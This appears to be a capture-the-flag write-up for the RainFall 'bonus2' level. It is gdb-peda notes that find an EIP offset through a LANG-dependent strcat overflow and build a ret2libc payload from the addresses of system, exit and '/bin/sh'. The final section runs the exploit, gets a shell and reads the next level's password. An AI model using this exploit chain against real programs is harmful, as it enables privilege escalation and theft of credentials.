# we should have at least 2 parameters to execute the main function
# otherwise we exit from main

# we have strcat and strncpy functions that maybe we can oveflow

# we have also memcmp function which compares LANG (environnement variable) with 'nl' or 'fi'
# then we modify the value of the gobal variable language.
# automatically we call strcat in the function greetuser and we have 3 type of
# strings to concanetate to our input argument.

# the offset of program segfault
gdb-peda$ pattern_create  100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Stopped reason: SIGSEGV
0x0800413b in ?? ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
EBP+0 found at offset: 26
ECX+52 found at offset: 69

# we have to find which argv[1] or argv[2] allow to overwrite EIP
gdb-peda$ r $(python -c 'print "B"*100') 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
[...]
EBP: 0x41414441 ('ADAA')
[...]
Stopped reason: SIGSEGV

gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' $(python -c 'print "B"*100')
[...]
EBP: 0x42424242 ('BBBB')
[...]
Stopped reason: SIGSEGV
# so argv[2]

# we can overwrite now EIP with our argv[2]

# now let's look at the environnement virable lang to see if it has an influence
# LANG = 'fil'
export LANG="fi"
gdb-peda$ r $(python -c 'print "A"*100') 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Stopped reason: SIGSEGV
0x2d414143 in ?? ()
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 18
# EPI overwrite at 18

# we are going to use a ret2libc exploit to call libc system function
# but we need the addresses of
# "system"
# "/bin/sh" string
# "exit"

# system address
gdb-peda$ info func system
All functions matching regular expression "system":
Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr

# "/bin/sh" address
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f8cc58 ("/bin/sh")
gdb-peda$ x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
#address of  "/bin/sh" : 0xb7f8cc58

# exit address
gdb-peda$ info func exit
All functions matching regular expression "exit":
Non-debugging symbols:
0xb7e5ebe0  exit
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit
# address of exit : 0xb7e5ebe0

# Our payload = ("A" * 18) + (system address) + (exit address) + ("/bin/sh" address)
# payload = python -c 'print "A"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"'

export LANG='fi'
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*100') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X��
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
